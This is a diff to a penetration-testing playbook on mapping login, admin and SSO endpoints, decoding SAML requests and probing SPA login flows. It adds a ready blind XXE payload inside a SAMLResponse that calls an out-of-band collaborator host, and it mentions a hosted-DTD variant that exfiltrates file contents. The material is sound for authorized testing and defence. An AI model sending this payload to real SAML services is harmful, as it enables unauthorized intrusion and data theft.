@@ -10,18 +10,70 @@ Not covered as a distinct step before. Run after Phase 2 tech fingerprinting, be
 Phase 4. Goal: enumerate every login, registration, onboarding and admin endpoint
 across all live hosts — these are the highest-value attack surface for auth bugs.
 
-Wordlist (`auth-paths.txt`):
+Wordlist (`auth-paths.txt`) — one path per line (the loop below reads line-wise):
 ```
-/login /signin /sign-in /logon /auth /auth/login /authenticate /sso /sso/login
-/account/login /user/login /users/login /users/sign_in /session /session/new
-/oauth /oauth/authorize /oauth2/authorize /oidc /oidc/authorize
-/realms/master /realms/master/protocol/openid-connect/auth /authorize
-/login.html /login.aspx /login.php /portal /portal/login /secure/login /identity
-/saml /saml/login /samlsso /adfs/ls /cas/login /shibboleth
-/register /signup /sign-up /create-account /account/register /user/register
-/users/new /enrollment /enrol /enroll /onboarding /activate /join
-/admin /admin/login /admin/register /administrator /wp-admin /wp-login.php
-/manager /manager/html /console /backoffice /controlpanel /dashboard /staff
+/login
+/signin
+/sign-in
+/logon
+/auth
+/auth/login
+/authenticate
+/sso
+/sso/login
+/account/login
+/user/login
+/users/login
+/users/sign_in
+/session
+/session/new
+/oauth
+/oauth/authorize
+/oauth2/authorize
+/oidc
+/oidc/authorize
+/realms/master
+/realms/master/protocol/openid-connect/auth
+/authorize
+/login.html
+/login.aspx
+/login.php
+/portal
+/portal/login
+/secure/login
+/identity
+/saml
+/saml/login
+/samlsso
+/adfs/ls
+/cas/login
+/shibboleth
+/register
+/signup
+/sign-up
+/create-account
+/account/register
+/user/register
+/users/new
+/enrollment
+/enrol
+/enroll
+/onboarding
+/activate
+/join
+/admin
+/admin/login
+/admin/register
+/administrator
+/wp-admin
+/wp-login.php
+/manager
+/manager/html
+/console
+/backoffice
+/controlpanel
+/dashboard
+/staff
 ```
 
 Generate host×path and probe fast with httpx:
@@ -43,13 +95,15 @@ Triage rules:
 When an SP 302-redirects to an IdP (`.../adfs/ls/?SAMLRequest=...&RelayState=...`),
 decode the `SAMLRequest` to read SP metadata (ACS URL, Issuer, Destination, library).
 
-Encoding = **URL-encode( base64url( raw-DEFLATE(xml) ) )** (zlib `wbits=-15`).
+Encoding = **URL-encode( base64( raw-DEFLATE(xml) ) )** (zlib `wbits=-15`).
+Note: SAML Redirect binding uses STANDARD base64 (not base64url) — URL-encoding
+is what makes it URL-safe.
 
 ```bash
 # automated (script in pt_brahmastra/playbooks/saml_decode.py):
 curl -sk "https://SP/login" -D - -o /dev/null | python3 saml_decode.py --from-location-header
-# manual:
-echo '<SAMLRequest>' | base64 -d | python3 -c "import sys,zlib;print(zlib.decompress(sys.stdin.buffer.read(),-15).decode())"
+# manual (URL-decode first, then base64, then raw-DEFLATE):
+echo '<SAMLRequest>' | python3 -c "import sys,base64,zlib,urllib.parse;print(zlib.decompress(base64.b64decode(urllib.parse.unquote(sys.stdin.read().strip())),-15).decode())"
 ```
 
 What to extract and report: `AssertionConsumerServiceURL` (often leaks an INTERNAL
@@ -85,12 +139,43 @@ Modern SSO is often a SPA (React/Vue) over NetIQ/Keycloak/etc. Extract the auth 
 from the JS bundle to map the login state machine:
 
 1. `curl -sk <signin-page> | grep -oE 'src="[^"]+\.js"'` → download each bundle.
-2. Grep for endpoint strings: `grep -oE '"/[a-z-]+"' app.js | sort -u` and the
+2. Grep for endpoint strings: `grep -oE '"/[a-zA-Z0-9_./-]+"' app.js | sort -u` and the
    `.concat(base, "/endpoint")` maps.
 3. Poll the unauthenticated state endpoint (`/state`, `/start`, `/authn/signin/state`)
    to dump the flow config (`view`, `progressPercent`, `expressAuthEnabled`, self-service flags).
 4. Look for step-skip endpoints: `promote`/`demote` (NetIQ AM migration), `express-auth`,
    `resend-*` (MFA), `*-self-unblock-init` (self-service reset = account-takeover surface).
+
+## E. SAMLResponse OOB XXE — callback-only (no DTD hosting)
+
+When a SAML SP consumes a `SAMLResponse` (e.g. `.../callback?client_name=Saml2Client`)
+and you only need to CONFIRM blind XXE (not read a file), skip the two-stage
+hosted-DTD dance entirely. Reference your interactsh URL directly as an external
+entity and use it in the document body:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE samlp:Response [
+  <!ENTITY xxe SYSTEM "https://<token>.oast.live">
+]>
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ...>
+  ...
+  &xxe;
+</samlp:Response>
+```
+
+POST the whole thing base64-encoded as `SAMLResponse=<b64>` (form-urlencoded) to the
+callback. The `&xxe;` in the body forces the parser to resolve the external entity,
+firing the HTTP request to your collaborator. No paste.rs, no attacker-hosted DTD.
+
+Pitfalls:
+- If the parser only resolves entities inside DTD declarations (not the document
+  body), the direct reference won't fire; fall back to the two-stage hosted-DTD
+  version (stage-2 DTD exfiltrates `?d=%file;` to the sink).
+- Blind XXE often returns `303 -> /error` with an empty body; the ONLY signal is
+  the OOB callback, so watch the collaborator dashboard, not the HTTP response.
+- `-k` is required when the target TLS cert is expired.
+- File-read exfil content must be single-line/URI-safe or the callback breaks.
 
 ## Reference files to update
 
